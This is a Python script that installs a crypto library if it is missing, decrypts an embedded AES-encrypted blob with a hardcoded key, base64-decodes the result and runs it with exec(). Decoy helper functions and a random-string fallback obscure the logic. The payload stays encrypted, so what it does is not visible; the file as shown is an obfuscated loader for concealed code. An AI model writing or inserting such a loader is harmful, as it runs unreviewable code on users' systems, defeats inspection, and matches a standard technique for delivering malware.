import subprocess
import sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import base64
    import hashlib
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    import random
    import string
except ImportError:
    print("Required packages not found. Installing...")
    install("pycryptodome")
    import base64
    import hashlib
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    import random
    import string

k1 = "111-222-333"

def _rand_str(n):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

def _xor(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])

def _multiply(a, b):
    return a * b

def _concat(a, b):
    return a + b

def _decode_base64(a):
    return base64.b64decode(a)

def _sha256_hash(a):
    return hashlib.sha256(a.encode()).digest()

def _decrypt_simplified(a1, a2, key):
    d1 = _sha256_hash(key)
    cipher = AES.new(d1, AES.MODE_CBC, a1)
    decrypted = unpad(cipher.decrypt(a2), AES.block_size)
    return decrypted

def _hidden_logic(s1, s2):
    random_op = random.choice([_xor, _multiply, _concat])
    return random_op(s1, s2)

def _get_parts(a):
    b = a.split(":")
    return bytes.fromhex(b[0]), bytes.fromhex(b[1])

def _obfuscated_decrypt(enc_str, key):
    try:
        part1, part2 = _get_parts(enc_str)
        decrypted = _decrypt_simplified(part1, part2, key)

        decoded = _decode_base64(decrypted)  
        return decoded.decode("utf-8")  
    except Exception as e:  
        return _rand_str(10)

encrypted_string = "0492f6eda657a8441dd5a9ebb77a940f:d932e0147e7fb70d485969481c3f541bf53b243d68953be30d7b10deb5037b354d10118cff178269f80488884668e6633fff781a7772d2bc756da5b0610e6ef456434110c8e2299360a3e8b3bd4755468df03c165a19534cdb82a8e2db7b2cf774e9c0edd8c70a30332e9859b059e891a0b39d0a9507a497834411bf37fb3eacc8d6badd6772554b54f359f051f746d34d2f458d02028f1ece6c5fc2b371281d7966f829642b698693a617a22982dfdaf61029964a9a60fa6fd8080431f1852823f8d8bd0f8763ca99363bba7f2f95c892b6ce95f2db9ee4aa02412329a101eb"

decrypted_code = _obfuscated_decrypt(encrypted_string, k1)

# Print out the raw decrypted code to debug
print("Raw Decrypted Code:\n", decrypted_code)

# Check if the decrypted code is valid (no "failed" message)
if "failed" not in decrypted_code:
    try:
        print("Executing Decrypted Code...\n")
        exec(decrypted_code)
    except Exception as e:
        print("Error executing code:", e)
else:
    print("Decryption failed.")
